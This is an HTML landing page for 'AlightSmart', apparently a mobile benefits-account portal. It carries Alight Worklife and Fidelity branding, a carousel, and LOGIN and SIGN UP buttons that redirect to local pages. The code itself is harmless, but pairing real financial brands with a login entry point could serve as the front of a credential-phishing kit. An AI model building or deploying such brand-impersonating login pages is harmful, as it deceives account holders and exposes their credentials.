<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AlightSmart - Smart Choice Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #000;
            color: white;
            height: 100dvh;
            overflow: hidden;
            margin: 0;
            padding: 0;
            position: relative;
        }

        /* LOGO */
        .logo-container {
            text-align: center;
            padding: 25px 20px 15px;
            z-index: 40;
            position: relative;
            background: rgba(0, 0, 0, 0.45);
            
        }

        .alight-worklife {
            font-size: 2.3rem;
            font-weight: 700;
            letter-spacing: -0.02em;
            margin-bottom: 8px;
        }
        .alight-worklife .alight { color: #1a1a1a; }
        .alight-worklife .worklife {
            background: linear-gradient(90deg, #7ed957, #34d399);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 700;
        }

        .united-logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-top: 6px;
        }
        .united-logo .united-text {
            font-size: 2rem;
            font-weight: 800;
            color: #0033a0;
            letter-spacing: 0.05em;
        }
        .globe { font-size: 2.2rem; line-height: 1; }

        /* Fidelity Logo - Improved version */
 .fidelity-logo {
            display: flex;
            justify-content: center;
            margin: 15px 0 25px;
            background: rgba(255,255,255,0.95);
            border-radius: 12px;
            padding: 12px;
        }
        .fidelity-logo img {
            width: 180px;
            height: auto;
        }


        /* FULL SCREEN CAROUSEL */
        .carousel {
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            overflow: hidden;
            z-index: 1;
        }
        .slides {
            display: flex;
            transition: transform 0.5s ease;
            height: 100%;
            width: 100%;
        }
        .slide {
            min-width: 100%;
            height: 100%;
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: flex-end;
            padding: 40px 25px 180px;
            position: relative;
        }
        .slide::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(transparent, rgba(0,0,0,0.78));
        }
        .slide-content {
            position: relative;
            z-index: 2;
            max-width: 380px;
            margin-bottom: 40px;
            text-align: center;
        }
        .slide h2 { font-size: 2rem; margin-bottom: 25px; }
        .slide p { font-size: 1.1rem; line-height: 1.45; }

        /* BUTTONS */
        .buttons {
            position: absolute;
            bottom: 125px;
            left: 0; right: 0;
            padding: 0 25px;
            display: flex;
            gap: 15px;
            z-index: 30;
        }
        .btn {
            flex: 1;
            padding: 15px;
            border-radius: 50px;
            font-size: 1.1rem;
            font-weight: 600;
            text-align: center;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
        }
        .btn-login { background: white; color: #1e40af; }
        .btn-signup { background: #166534; color: white; }

        /* DOTS */
        .dots {
            text-align: center;
            z-index: 35;
            position: absolute;
            bottom: 88px;
            left: 0; right: 0;
        }
        .dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #1ea05d;
            border-radius: 50%;
            margin: 0 5px;
            cursor: pointer;
        }
        .dot.active {
            background: white;
            transform: scale(1.3);
        }

        @media (max-width: 480px) {
            .alight-worklife { font-size: 2.05rem; }
            .united-logo .united-text { font-size: 1.85rem; }
            .slide h2 { font-size: 1.75rem; }
            .slide p { font-size: 1.05rem; }
            .buttons { bottom: 60px; }
            .dots { bottom: 130px; }
            .slide { padding-bottom: 170px; }
            .slide-content { top: 60px; }
        }
    </style>
</head>
<body>

    <div class="logo-container">
        <div class="alight-worklife">
            <span class="alight">alight</span>
            <span class="worklife">worklife</span><span style="font-size:0.55rem; vertical-align: super; color:#1a1a1a;">®</span>
        </div>
        <!-----
        <div class="united-logo">
            <span class=" united-text">UNITED</span>
            <span class="globe">🌐</span>
        </div>

        <!-- Fidelity Logo -->
        <div class="fidelity-logo">
            <img src="fidelity.jpg" 
                 alt="Fidelity Investments" 
                 onerror="this.style.display='none'; console.log('Fidelity logo failed to load');">
        </div>
    </div>

    <!-- Rest of your carousel and content remains the same -->
    <div class="carousel">
        <div class="slides" id="slides">
            <div class="slide" style="background-image: url('login.jpg');">
                <div class="slide-content">
                    <h2>Innovative</h2>
                    <p>Manage all aspects of health and wealth using our AI-powered app.</p>
                </div>
            </div>
            <div class="slide" style="background-image: url('login2.jpg');">
                <div class="slide-content">
                    <h2>Personal</h2>
                    <p>Get personalized recommendations about spending and savings to maximize your account’s value.</p>
                </div>
            </div>
            <div class="slide" style="background-image: url('login3.jpg');">
                <div class="slide-content">
                    <h2>Simple</h2>
                    <p>Account self-service made easy!</p>
                </div>
            </div>
        </div>
    </div>

    <div class="buttons">
        <div class="btn btn-login" onclick="goToLogin()">LOGIN</div>
        <div class="btn btn-signup" onclick="goToSignup()">SIGN UP</div>
    </div>

    <div class="dots" id="dots"></div>

    <script>
        let currentSlide = 0;
        const slides = document.getElementById('slides');
        const totalSlides = 3;
        const dotsContainer = document.getElementById('dots');

        for (let i = 0; i < totalSlides; i++) {
            const dot = document.createElement('span');
            dot.classList.add('dot');
            if (i === 0) dot.classList.add('active');
            dot.onclick = () => goToSlide(i);
            dotsContainer.appendChild(dot);
        }

        function goToSlide(n) {
            currentSlide = n;
            slides.style.transform = `translateX(-${currentSlide * 100}%)`;
            updateDots();
        }

        function updateDots() {
            const dots = dotsContainer.querySelectorAll('.dot');
            dots.forEach((dot, i) => dot.classList.toggle('active', i === currentSlide));
        }

        setInterval(() => {
            currentSlide = (currentSlide + 1) % totalSlides;
            slides.style.transform = `translateX(-${currentSlide * 100}%)`;
            updateDots();
        }, 5000);

        let touchStartX = 0;
        slides.addEventListener('touchstart', e => touchStartX = e.changedTouches[0].screenX);
        slides.addEventListener('touchend', e => {
            const touchEndX = e.changedTouches[0].screenX;
            if (touchEndX < touchStartX - 50) currentSlide = (currentSlide + 1) % totalSlides;
            else if (touchEndX > touchStartX + 50) currentSlide = (currentSlide - 1 + totalSlides) % totalSlides;
            slides.style.transform = `translateX(-${currentSlide * 100}%)`;
            updateDots();
        });

        function goToLogin() { window.location.href = "login.html"; }
        function goToSignup() { window.location.href = "index.html"; }
    </script>
</body>
</html>
